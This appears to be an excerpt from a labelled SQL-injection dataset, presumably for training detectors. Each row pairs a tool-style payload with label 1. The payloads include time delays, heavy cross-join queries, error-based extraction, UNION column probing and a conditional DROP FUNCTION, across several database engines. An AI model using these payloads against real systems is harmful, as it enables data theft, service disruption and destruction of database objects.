row_index,payload_norm,label,sqli_type_hint
5850,"1"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""cmhh"" like ""cmhh",1,
5851,select sleep ( 5 ) and ( 1435 = 1435,1,
5852,"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""tkkg"" = ""tkkg",1,
5853,"-4866"" ) as eyrq where 8365 = 8365 or 1898 = 8320#",1,
5854,"1%"" ) waitfor delay '0:0:5'--",1,
5855,"1' ) as keom where 7524 = 7524 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5856,"-6971"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ifuh"" like ""ifuh",1,
5857,-8264%' ) order by 1#,1,
5858,if ( 6647 = 2179 ) select 6647 else drop function zvlq--,1,
5859,1'+ ( select 'ezpy' where 5282 = 5282 order by 1#,1,
5860,"-6770"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",1,
5861,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( '%' = '",1,
5862,"1%' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
5863,select 'qqpjq'|| ( case 5118 when 5118 then 1 else 0 end ) ||'qzvzq' from rdb$database,1,
5864,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'holo' = 'holo",1,
5865,"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mexd' like 'mexd",1,
5866,select ( case when ( 4780 = 4432 ) then 4780 else 4780* ( select 4780 from mysql.db ) end ) #,1,
5867,"1"" where 7599 = 7599",1,
5868,"1 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # bzoq",1,
5869,1%' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( '%' = ',1,
5870,1'|| ( select 'yzdz' where 5021 = 5021,1,
5871,-4617' ) ) ) or 9323 = 9323#,1,
5872,"1' ) as khaa where 8157 = 8157 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
5873,"1 ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 6556 = 6556",1,
5874,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""uvoq"" like ""uvoq",1,
5875,"1,iif ( 7475 = 7475,1,1/0 )",1,
5876,"-7564' ) as nank where 8095 = 8095 union all select 8095,8095,8095--",1,
5877,1 ) as pyjx where 9005 = 9005,1,
5878,"1"" ) as doai where 7024 = 7024 union all select null,null,null,null,null,null,null,null--",1,
5879,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""uvvy"" like ""uvvy",1,
